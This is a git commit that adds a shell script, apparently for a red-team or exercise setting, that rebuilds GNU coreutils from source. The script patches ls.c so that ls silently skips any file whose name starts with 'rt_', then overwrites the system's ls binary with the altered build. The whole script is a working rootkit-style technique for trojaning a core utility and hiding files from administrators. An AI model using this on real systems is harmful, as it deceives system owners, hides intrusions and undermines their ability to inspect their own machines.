e60da9c3b6f0a73c111dadd374d2731525f70f4c
Jack <62919016+JackDunfey@users.noreply.github.com>
2024-11-22 03:10:30 -0500

    ls break

---
+++ coreutils/break_ls.sh
@@ -0,0 +1,26 @@
+sed -i -e 's/# deb-src/deb-src/' /etc/apt/sources.list
+apt update
+apt-get source -y coreutils && apt-get build-dep -y coreutils
+cd coreutils-*
+yes | autoreconf -fiv
+FORCE_UNSAFE_CONFIGURE=1 ./configure --prefix=/usr --disable-silent-rules
+awk 'BEGIN { 
+  found = 0; inserted = 0
+} 
+/file_ignored \(char const \*name\)$/ { 
+  print $0
+  found = 1
+  next
+} 
+found == 1 && inserted == 0 && $0 == "{" { 
+  print $0
+  print "  if (strncmp(name, \"rt_\", 3) == 0) { return true; }"
+  inserted = 1
+  found = 2
+  next
+} 
+{ print $0 }' src/ls.c > tempfile && mv tempfile src/ls.c
+make -j${nproc}
+echo "Replacing ls"
+cp src/ls $(which ls)
+cd ..
